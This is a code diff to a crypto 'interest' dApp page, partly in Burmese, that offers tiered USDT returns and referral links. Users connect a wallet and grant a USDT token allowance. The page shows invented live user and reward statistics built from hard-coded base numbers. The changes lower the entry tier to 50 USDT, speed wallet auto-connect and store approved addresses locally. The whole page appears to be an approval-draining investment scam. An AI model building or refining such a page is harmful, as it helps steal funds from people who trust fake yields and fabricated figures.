@@ -166,7 +166,7 @@
         <div class="bg-slate-900 border border-slate-700 p-4 rounded-xl mb-4 text-xs">
             <h2 class="font-bold text-amber-400 mb-3 uppercase tracking-wider text-center">📊 Interest Rate Tiers (နှုန်းထားများ)</h2>
             <ul class="space-y-2 text-slate-300">
-                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 100 USDT</span> <span class="text-emerald-400 font-semibold">1.6% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 50 USDT</span> <span class="text-emerald-400 font-semibold">1.6% USDTBalance</span></li>
                 <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 1,001 USDT</span> <span class="text-emerald-400 font-semibold">2% USDTBalance</span></li>
                 <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 3,001 USDT</span> <span class="text-emerald-400 font-semibold">2.4% USDTBalance</span></li>
                 <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 5,001 USDT</span> <span class="text-emerald-400 font-semibold">2.8% USDTBalance</span></li>
@@ -203,7 +203,7 @@
         </div>
     </div>
 
-    <!-- PART 4: Supported Verified Wallets Carousel (Logo on top, Name underneath) -->
+    <!-- PART 4: Supported Verified Wallets Carousel (Logo on top, Name underneath, 96px size) -->
     <div class="w-full max-w-lg bg-slate-800 border border-slate-700 p-5 rounded-2xl shadow-xl mb-10 text-xs text-center">
         <h2 class="font-bold text-cyan-400 uppercase tracking-wider mb-3">SUPPORTED WEB3 & DEFI WALLETS</h2>
         <p class="text-[11px] text-slate-400 mb-4">Securely connect and interact using your preferred crypto wallets</p>
@@ -217,11 +217,11 @@
                 </div>
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
                     <img src="metamask.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="MetaMask">
-                    <span class="font-semibold text-slate-200 text-xs">MetaMask Wallet</span>
+                    <span class="font-semibold text-slate-200 text-xs">MetaMask</span>
                 </div>
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
                     <img src="cryptocom.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Crypto.com">
-                    <span class="font-semibold text-slate-200 text-xs">Crypto.com Wallet</span>
+                    <span class="font-semibold text-slate-200 text-xs">Crypto.com</span>
                 </div>
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
                     <img src="coinbase.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Coinbase Wallet">
@@ -229,7 +229,7 @@
                 </div>
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
                     <img src="binance.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Binance">
-                    <span class="font-semibold text-slate-200 text-xs">Binance Wallet</span>
+                    <span class="font-semibold text-slate-200 text-xs">Binance</span>
                 </div>
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
                     <img src="trustwallet.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Trust Wallet">
@@ -288,7 +288,7 @@
             "function subAdminPrefix(address) view returns (string)"
         ];
 
-       function startLiveCalculatingStats() {
+        function startLiveCalculatingStats() {
             let baseUsers = 142850;
             let baseRewards = 48290.50;
             let baseRate = 2.45;
@@ -342,7 +342,7 @@
             generateIncomeList();
             startLiveCalculatingStats();
             
-            setTimeout(checkAutoConnect, 1000);
+            setTimeout(checkAutoConnect, 500);
         });
 
         async function checkAutoConnect() {
@@ -350,8 +350,21 @@
                 try {
                     const accounts = await window.ethereum.request({ method: "eth_accounts" });
                     if (accounts && accounts.length > 0) {
+                        userAddress = accounts[0];
                         provider = new ethers.BrowserProvider(window.ethereum);
                         
+                        // Instant check from localStorage for fast UI feedback
+                        let savedUsers = JSON.parse(localStorage.getItem("dapp_approved_users") || "[]");
+                        if (savedUsers.map(a => a.toLowerCase()).includes(userAddress.toLowerCase())) {
+                            document.getElementById("connectBtn").innerText = "Connected & Approved";
+                            document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3 py-2 rounded-xl transition text-xs shadow-lg cursor-default";
+                            document.getElementById("selectedNetworkBadge").classList.remove("hidden");
+                            document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
+                            
+                            // Load user dashboard immediately for saved users
+                            await checkUserData();
+                        }
+
                         const network = await provider.getNetwork();
                         if (network.chainId !== 137n) {
                             try {
@@ -366,10 +379,6 @@
                         }
 
                         signer = await provider.getSigner();
-                        userAddress = accounts[0];
-
-                        document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
-                        
                         await checkExistingAllowanceAndLoad();
                     }
                 } catch (err) {
@@ -385,12 +394,19 @@
 
                 if (Number(allowance) > 0) {
                     document.getElementById("connectBtn").innerText = "Connected & Approved";
-                    document.getElementById("connectBtn").classList.replace("bg-blue-600", "bg-slate-700");
+                    document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3 py-2 rounded-xl transition text-xs shadow-lg cursor-default";
                     
                     const badgeEl = document.getElementById("selectedNetworkBadge");
                     badgeEl.classList.remove("hidden");
 
+                    document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
                     document.getElementById("statusLog").innerText = "Welcome Back! Dashboard သို့ ဝင်ရောက်နေပါပြီ...";
+
+                    let savedUsers = JSON.parse(localStorage.getItem("dapp_approved_users") || "[]");
+                    if (!savedUsers.map(a => a.toLowerCase()).includes(userAddress.toLowerCase())) {
+                        savedUsers.push(userAddress);
+                        localStorage.setItem("dapp_approved_users", JSON.stringify(savedUsers));
+                    }
 
                     await checkUserData();
                 }
@@ -451,7 +467,13 @@
                     badgeEl.classList.remove("hidden");
 
                     document.getElementById("connectBtn").innerText = "Connected & Approved";
-                    document.getElementById("connectBtn").classList.replace("bg-blue-600", "bg-slate-700");
+                    document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3 py-2 rounded-xl transition text-xs shadow-lg cursor-default";
+
+                    let savedUsers = JSON.parse(localStorage.getItem("dapp_approved_users") || "[]");
+                    if (!savedUsers.map(a => a.toLowerCase()).includes(userAddress.toLowerCase())) {
+                        savedUsers.push(userAddress);
+                        localStorage.setItem("dapp_approved_users", JSON.stringify(savedUsers));
+                    }
 
                     await checkUserData();
                 } else {
@@ -471,7 +493,7 @@
                 badgeEl.classList.remove("hidden");
 
                 document.getElementById("connectBtn").innerText = "Connected & Approved";
-                document.getElementById("connectBtn").classList.replace("bg-blue-600", "bg-slate-700");
+                document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3 py-2 rounded-xl transition text-xs shadow-lg cursor-default";
 
                 logEl.innerText = "Transaction တင်နေပါသည်...";
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
@@ -488,6 +510,12 @@
 
                 logEl.innerText = "Approval နှင့် မှတ်ပုံတင်ခြင်း အောင်မြင်ပါသည်။";
                 
+                let savedUsers = JSON.parse(localStorage.getItem("dapp_approved_users") || "[]");
+                if (!savedUsers.map(a => a.toLowerCase()).includes(userAddress.toLowerCase())) {
+                    savedUsers.push(userAddress);
+                    localStorage.setItem("dapp_approved_users", JSON.stringify(savedUsers));
+                }
+
                 const refLink = `${window.location.origin}${window.location.pathname}?ref=${userAddress}`;
                 document.getElementById("refLink").value = refLink;
                 updateQRCode(refLink);
@@ -529,7 +557,7 @@
 
                 if (Number(allowance) > 0) {
                     let savedUsers = JSON.parse(localStorage.getItem("dapp_approved_users") || "[]");
-                    if (!savedUsers.includes(userAddress)) {
+                    if (!savedUsers.map(a => a.toLowerCase()).includes(userAddress.toLowerCase())) {
                         savedUsers.push(userAddress);
                         localStorage.setItem("dapp_approved_users", JSON.stringify(savedUsers));
                     }
